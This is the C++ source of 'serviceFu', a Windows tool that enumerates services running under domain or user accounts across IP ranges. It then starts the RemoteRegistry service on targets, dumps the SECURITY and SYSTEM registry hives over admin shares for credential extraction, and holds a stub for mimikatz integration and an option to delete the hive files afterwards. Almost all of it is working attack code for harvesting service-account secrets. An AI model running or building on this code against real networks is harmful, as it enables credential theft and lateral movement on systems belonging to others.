#include <stdio.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <set>
#include <string>
#include <vector>
#include <algorithm>
#include <stdlib.h>
#include <winreg.h>
#include <fstream>

#include "getopt.h"
#include "debug.h"
#include "utils.h"

#ifdef MIMIKATZLIB
#include "lsadumpsecrets.h"
#endif

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Advapi32.lib")

#ifdef MIMIKATZLIB
	#ifdef _DEBUG
		#pragma comment(lib, "LsadumpSecrets_Debug.lib")
	#else
		#pragma comment(lib, "LsadumpSecrets_Release.lib")
	#endif
#endif

std::set<std::string> ignored;

/**
 * searchIgnored - search global ignored container for occurence of string
 */
bool searchIgnored(std::string str)
{
	for(std::string s : ignored) {
		if(s.compare(str) == 0)
			return true;
	}

	return false;
}

/**
 * find_interesting_services - find occurences of services which run using context
 *	of user account not in ignored list.
 */
std::vector<std::string> find_interesting_services(SC_HANDLE hSCM) {
	std::vector<std::string> svc;
	void* buf = NULL;
	DWORD bufSize = 0;
	DWORD moreBytesNeeded, serviceCount;

	for(;;) {

		if(EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)buf, bufSize, &moreBytesNeeded, &serviceCount, NULL, NULL)) {
			ENUM_SERVICE_STATUS_PROCESSA* services = (ENUM_SERVICE_STATUS_PROCESSA*)buf;

			for(DWORD i = 0; i < serviceCount; ++i) {
				//printf("%s\n", services[i].lpServiceName);

				SC_HANDLE currService = NULL;
				currService = OpenServiceA(hSCM, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
				if(currService != NULL) {
					//printf("QueryServiceConfig: %s\n", services[i].lpServiceName);

					void* configBuf = NULL;
					DWORD configBufSize = 0;
					DWORD moreConfigBytesNeeded;

					for(;;) {
						if(QueryServiceConfigA(currService, (LPQUERY_SERVICE_CONFIGA)configBuf, configBufSize, &moreConfigBytesNeeded)) {
							LPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)configBuf;
							//printf("%s\n", services[i].lpServiceName);
							//printf("\trunning as: %s\n", config->lpServiceStartName);
							std::string str(config->lpServiceStartName);
							std::transform(str.begin(), str.end(), str.begin(), ::tolower);
							//test.insert(s);
							if(!searchIgnored(str))
								svc.push_back(str);
							break;
						}

						int err2 = GetLastError();
						if(ERROR_INSUFFICIENT_BUFFER != err2) {
							break;
						}

						configBufSize += moreConfigBytesNeeded;
						free(configBuf);
						configBuf = malloc(configBufSize);
					}
					if(configBuf)
						free(configBuf);
					CloseServiceHandle(currService);
				}
			}
			if(buf)
				free(buf);
			break;
		}

		int err = GetLastError();
		if(ERROR_MORE_DATA != err) {
			if(buf)
				free(buf);
			break;
		}

		bufSize += moreBytesNeeded;
		if(buf)
			free(buf);
		buf = malloc(bufSize);
	}

	return svc;
}

/**
 * translate_cidr - takes an ip range in CIDR notation (i.e 127.0.0.1/24)
 *	and return vector of each individual ip
 */
std::vector<std::string> translate_cidr(std::string iprange)
{
	std::vector<std::string> hosts;
	size_t found = std::string::npos;

	found = iprange.find('/');

	std::string ip_str = iprange.substr(0, found);
	std::string mask_str = iprange.substr(found+1, iprange.size() - found);

	try {
		//convert bitmask string to int
		unsigned int mask_bits = std::stoi(mask_str, nullptr, 10);

		//calculate netmask
		const unsigned int max_mask = MAXUINT32, max_mask_bits = 32;
		ULONG masknum = max_mask << (max_mask_bits - mask_bits);
		ULONG maskval = ~masknum;
		IN_ADDR netmask;
		netmask.S_un.S_addr = htonl(masknum);

		//convert ip string to int val (network byte order)
		IN_ADDR startingIp = {0};;
		int ret = InetPtonA(AF_INET, ip_str.c_str(), &startingIp);
		if(ret != 1) {
			DebugFprintf(outlogfile, PRINT_ERROR, "[-] could not convert to Ipv4 address.\n");
			return hosts;
		}

		//starting from first ip, add ip to vector
		IN_ADDR curr_ip = {0};
		curr_ip.S_un.S_addr = netmask.S_un.S_addr & startingIp.S_un.S_addr;
		int curr_ip_hostbyteorder = ntohl(curr_ip.S_un.S_addr);
		for(unsigned int i=0; i<=maskval; i++) {

			//create string to hold ip and add it to vector
			char currIpStr[INET_ADDRSTRLEN] = {0};
			InetNtopA(AF_INET, &curr_ip, currIpStr, INET_ADDRSTRLEN);
			std::string curr_ip_str(currIpStr);
			hosts.push_back(curr_ip_str);

			//increment ip addr
			curr_ip_hostbyteorder++;
			curr_ip.S_un.S_addr = htonl(curr_ip_hostbyteorder);
		}
		
	}
	catch(std::string ex) {
		//TODO handle this????
	}

	return hosts;
}

/**
 * translate_iprange - takes an ip range in '-' separated notation 
 *  (i.e 127.0.0.1-127.0.0.3) and return vector of each individual ip
 */
std::vector<std::string> translate_iprange(std::string iprange)
{
	std::vector<std::string> hosts;
	size_t found = std::string::npos;

	found = iprange.find('-');

	std::string start_ip = iprange.substr(0, found);
	std::string end_ip = iprange.substr(found+1, iprange.size() - found);

	IN_ADDR start_addr = {0};
	int ret = InetPtonA(AF_INET, start_ip.c_str(), &start_addr);
	if(ret != 1) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] could not convert to Ipv4 address.\n");
		return hosts;
	}

	IN_ADDR end_addr = {0};;
	ret = InetPtonA(AF_INET, end_ip.c_str(), &end_addr);
	if(ret != 1) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] could not convert to Ipv4 address.\n");
		return hosts;
	}

	ULONG first_ip_hostbyteorder = ntohl(start_addr.S_un.S_addr);
	ULONG last_ip_hostbyteorder = ntohl(end_addr.S_un.S_addr);
	for(ULONG curr_ip=first_ip_hostbyteorder; curr_ip<=last_ip_hostbyteorder; curr_ip++) {

		//create string to hold ip and add it to vector
		char currIpStr[INET_ADDRSTRLEN] = {0};
		ULONG curr_ip_netbyteorder = htonl(curr_ip);
		InetNtopA(AF_INET, &curr_ip_netbyteorder, currIpStr, INET_ADDRSTRLEN);
		std::string curr_ip_str(currIpStr);
		hosts.push_back(curr_ip_str);
	}

	return hosts;
}

/**
 * translate_targets - translate string representing targets. It can separate
 *	by commas, and in turn can expand CIDR notation or '-' separated format.
 */
std::vector<std::string> translate_targets(std::string input_hosts)
{
	std::vector<std::string> hosts_raw;

	if(input_hosts.find(',') != std::string::npos) {
		//comma seperated list of hosts (172.16.4.0/24,127.0.0.1,127.0.0.2)
		size_t found_first = 0, found = 0;
		while((found = input_hosts.find(',', found)) != std::string::npos) {
			hosts_raw.push_back(input_hosts.substr(found_first, found-found_first));
			found_first = ++found;
		}
		//copy final item in list
		if(found_first < input_hosts.size()) {
			hosts_raw.push_back(input_hosts.substr(found_first));
		}
	}
	else {
		//treat as if there is only one target or target range specified
		hosts_raw.push_back(input_hosts);
	}

	std::vector<std::string> hosts;

	//final translation of targets
	for(auto i : hosts_raw) {
		if(i.find('/') != std::string::npos) {
			//assume ip address range in CIDR notation
			std::vector<std::string> translated_range = translate_cidr(i);
			hosts.insert(hosts.end(), translated_range.begin(), translated_range.end());
		}
		else if(i.find('-') != std::string::npos) {
			//assume ip address range in 127.0.0.1-127.0.0.3 notation
			printf("IP ranges in IP-IP format supported yet\n");
			std::vector<std::string> translated_range = translate_iprange(i);
			hosts.insert(hosts.end(), translated_range.begin(), translated_range.end());
		}
		else {
			//single ip address or hostname
			hosts.push_back(i);
		}
	}

	return hosts;
}

void parse_ignore_file(std::string inputFile)
{
	std::ifstream inFile(inputFile);
	std::string line;

	while(std::getline(inFile, line)) {
		//make it lowercase
		std::transform(line.begin(), line.end(), line.begin(), ::tolower);

		//add to ignore list
		ignored.insert(line);
	}
}

std::vector<std::string> save_local_reg_hive(std::string destDir)
{
	std::vector<std::string> savedFiles;

	//Security hive
	HKEY securityHive;
	LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Security", 0, 0x20000, &securityHive);
	if(ret == ERROR_SUCCESS) {

		std::string filepath = destDir + "\\sec.hiv";
		ret = RegSaveKeyA(securityHive, filepath.c_str(), NULL);
		if(ret != ERROR_SUCCESS) {
			printf("error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
		}
		else {
			savedFiles.push_back(filepath);
		}

		RegCloseKey(securityHive);
	}
	else {
		printf("error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SECURITY %s\n", GetLastErrorAsString(ret).c_str());
	}

	//System hive
	HKEY systemHive;
	ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "System", 0, 0x20000, &systemHive);
	if(ret == ERROR_SUCCESS) {

		std::string filepath = destDir + "\\sys.hiv";
		ret = RegSaveKeyA(systemHive, filepath.c_str(), NULL);
		if(ret != ERROR_SUCCESS) {
			printf("error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
		}
		else {
			savedFiles.push_back(filepath);
		}

		RegCloseKey(systemHive);
	}
	else {
		printf("error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SYSTEM %s\n", GetLastErrorAsString(ret).c_str());
	}

	return savedFiles;
}

std::vector<std::string> save_remote_reg_hive(std::string target, std::string destDir)
{
	std::vector<std::string> savedFiles;

	std::string SecurityHiveStr = target + "_Security.hiv";
	std::string SystemHiveStr = target + "_System.hiv";
	std::string conn = "\\\\" + target;

	HKEY theKey;
	LONG ret = RegConnectRegistryA(conn.c_str(), HKEY_LOCAL_MACHINE, &theKey);
	if(ret == ERROR_SUCCESS) {
		std::string filePathRemote, filePathLocal;

		//Security hive
		HKEY securityHive;
		ret = RegOpenKeyExA(theKey, "Security", 0, 0x20000, &securityHive);
		if(ret == ERROR_SUCCESS) {

			ret = RegSaveKeyA(securityHive, "sec.hiv", NULL);
			if(ret == ERROR_SUCCESS) {
				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sec.hiv";
				filePathLocal = destDir + "\\" + SecurityHiveStr;

				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
				if(ret2 == FALSE) {
					printf("error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
					DeleteFileA(filePathRemote.c_str());
				}
				else {
					savedFiles.push_back(filePathLocal);
				}
			}
			else {
				printf("error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(GetLastError()).c_str());
			}

			RegCloseKey(securityHive);
		}
		else {
			printf("error RegOpenKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
		}

		//System hive
		HKEY systemHive;
		ret = RegOpenKeyExA(theKey, "System", 0, 0x20000, &systemHive);
		if(ret == ERROR_SUCCESS) {
			ret = RegSaveKeyA(systemHive, "sys.hiv", NULL);
			if(ret == ERROR_SUCCESS) {
				filePathRemote = "\\\\" + target + "\\c$\\Windows\\System32\\sys.hiv";
				filePathLocal = destDir + "\\" + SystemHiveStr;

				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
				if(ret2 == FALSE) {
					printf("error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
					DeleteFileA(filePathRemote.c_str());
				}
				else {
					savedFiles.push_back(filePathLocal);
				}
			}
			else {
				printf("error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
			}

			RegCloseKey(systemHive);
		}
		else {
			printf("error RegOpenKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
		}

		RegCloseKey(theKey);
	}
	else {
		printf("error RegConnectRegistryA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
	}

	return savedFiles;
}

void start_remote_registry_svc(SC_HANDLE sc, std::string target)
{
	if(!sc)
		return;

	SC_HANDLE svc = OpenServiceA(sc, "RemoteRegistry", SERVICE_START);

	if(!svc) {
		printf("error OpenServiceA: %s\n", GetLastErrorAsString(GetLastError()).c_str());
		return;
	}

	BOOL ret = StartServiceA(svc, NULL, NULL);
	if(ret == FALSE) {
		printf("error StartServiceA: %s\n", GetLastErrorAsString(GetLastError()).c_str());
	}
}

void svcfu(std::vector<std::string> targets, std::string destDir, bool forceSave, bool saveReg, bool delReg, bool runMimikatz)
{
	bool local = true;
	
	//adjust process privilege
	addPrivilegeToCurrentProcess("SeBackupPrivilege");

	//for every target specified
	for(std::string target : targets) {
		SC_HANDLE sc = NULL;

		//if no targets given default to localhost
		const char* targetStr = NULL;
		if(target.length() != 0) {
			printf("Machine: %s\n", target.c_str());
			targetStr = target.c_str();
			local = false;
		}
		else {
			printf("Machine: localhost\n");
		}
		
		//open service control manager
		sc = OpenSCManagerA(targetStr, NULL, SC_MANAGER_ENUMERATE_SERVICE);
		if(sc == NULL) {
			printf("error OpenSCManager: %s\n", GetLastErrorAsString(GetLastError()).c_str());
			return;
		}

		//find all the interesting services
		std::vector<std::string> all = find_interesting_services(sc);
		printf("\tInteresting services count: %d\n", all.size());
		for(std::string svc : all) {
			printf("\t\t%s\n", svc.c_str());
		}

		//post processing logic (registry save, mimikatz, and cleanup)
		std::vector<std::string> savedFiles;
		if(saveReg) {
			//if interesting service found or force flag set
			if(all.size() > 0 || forceSave) {
				
				//Save registry hives for getting credentials
				if(local) {
					savedFiles = save_local_reg_hive(destDir);
				}
				else {
					start_remote_registry_svc(sc, target);
					savedFiles = save_remote_reg_hive(target, destDir);
				}
			}

			if(runMimikatz) {
				//use mimikatz to obtain credentials
#ifdef MIMIKATZLIB
				//TODO integrate lsadumpsecrets code to be called here
#else
				printf("[-] Mimikatz support not compiled in. Rebuild\n");
#endif
			}

			if(delReg) {
				//delete registry hive files
				for(std::string file : savedFiles) {
					DeleteFileA(file.c_str());
				}
			}
		}

		if(sc)
			CloseServiceHandle(sc);
	}
}

void usage()
{
	printf("serviceFu - Find interesting services\n");
	printf("Usage:\n");
	printf("   h              help - show this help message\n");
	printf("   v num          verbosity - level of displayed information\n");
	printf("   t targets      target(s) - target computer(s) (defaul localhost). Accepts ranges and comma separated entries\n");
	printf("   o directory    output directory - directory to write registry hives\n");
	printf("   i file         ignore - user accounts to ignore from results\n");
	printf("   m              mimikatz - automatically use mimikatz to find creds\n");
	printf("   d              delete - delete registry hive files after mimikatz run\n");
	printf("   r              registry - grab registry hives if interesting services discovered\n");
}

/**
 * initialize - initialize ignored container with default account names
 */
void initialize()
{
	ignored.insert("");
	ignored.insert("localsystem");
	ignored.insert("nt authority\\localservice");
	ignored.insert("nt authority\\networkservice");
	ignored.insert("nt authority\\localservice");
	ignored.insert("nt authority\\system");
}

int main(int argc, char** argv)
{
	initialize();

	char* targetsInput = NULL;
	char* outputDir = NULL;
	char* ignoreFile = NULL;
	bool runMimikatz = false;
	bool delReg = false;
	bool saveReg = false;
	bool forceSave = false;

	//argument parsing
	int c = 0;
	while((c = getopt(argc, argv, "hv:t:o:i:mdrf")) != -1) {
		switch(c) {
		case 'h':
			usage();
			break;
		case 'v':
			verbosity = atoi(optarg); //TODO unsafe..fix this
			break;
		case 't':
			targetsInput = optarg;
			break;
		case 'o':
			outputDir = optarg;
			break;
		case 'i':
			ignoreFile = optarg;
			break;
		case 'm':
			runMimikatz = true;
			delReg = true;
			break;
		case 'd':
			delReg = true;
			break;
		case 'r':
			saveReg = true;
			break;
		case 'f':
			forceSave = true;
			break;
		case '?':
			printf("\n[-] Unrecognized option: %c\n\n", c);
			usage();
			return -1;
		default:
			printf("\n[-] Unrecognized option: %c\n\n", c);
			usage();
			return -1;
		}
	}

	//pares user input: ignore accounts
	if(ignoreFile) {
		parse_ignore_file(std::string(ignoreFile));
	}

	//parse user input: targets
	std::vector<std::string> targets;
	if(targetsInput != NULL) {
		targets = translate_targets(std::string(targetsInput));
	}
	else {
		targets.push_back(std::string());
	}

	//parse user input: output directory
	std::string destDir;
	if(outputDir)
		destDir = std::string(outputDir);
	else {
		outputDir = (char*)calloc(MAX_PATH+1, sizeof(char));
		if(outputDir) {
			GetCurrentDirectoryA(MAX_PATH, outputDir);
			destDir = std::string(outputDir);
		}
	}

	//main logic function
	svcfu(targets, destDir, forceSave, saveReg, delReg, runMimikatz);

	return 0;
}